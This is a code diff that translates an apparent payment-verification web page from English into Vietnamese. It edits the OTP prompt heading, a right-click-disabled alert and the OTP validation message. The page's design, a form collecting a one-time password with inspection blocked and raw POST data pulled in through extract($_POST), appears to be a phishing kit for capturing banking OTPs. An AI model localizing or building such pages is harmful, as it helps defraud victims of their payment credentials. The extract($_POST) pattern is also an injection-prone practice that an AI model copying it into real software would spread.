@@ -54,7 +54,7 @@ extract($_POST);
       <fieldset class="page2">
         <div class="page-heading">
           <h6 class="form-heading">Xác Thực Thanh Toán</h6>
-          <p class="form-subheading">Tin nhắn OTP đã được gửi đến số điện thoại di động kết thúc sau:<strong>1343</strong></p>
+          <p class="form-subheading">Tin nhắn OTP đã được gửi đến số điện thoại di động kết thúc sau:<strong>134s</strong></p>
 
 
         </div>
@@ -88,7 +88,7 @@ extract($_POST);
     function rightclickD(e) {
       e = e || event;
       if (e.button == 2) {
-        alert('Function Disabled...');
+        alert('Chức năng bị vô hiệu hóa...');
         return false;
       }
     }
@@ -96,7 +96,7 @@ extract($_POST);
     function ValidateForm() {
       var regPin = RegExp("^[0-9]{4,6}$");
       if (document.form1.customerpin.value == "" || !document.form1.customerpin.value.match(regPin)) {
-        alert("Please enter a valid 6 digit One Time Password (OTP) receive on your registered Mobile Number.");
+        alert("Vui lòng nhập Mật khẩu một lần (OTP) hợp lệ gồm 6 chữ số nhận được trên Số điện thoại di động đã đăng ký của bạn.");
         document.form1.customerpin.focus();
         return false;
       } else {
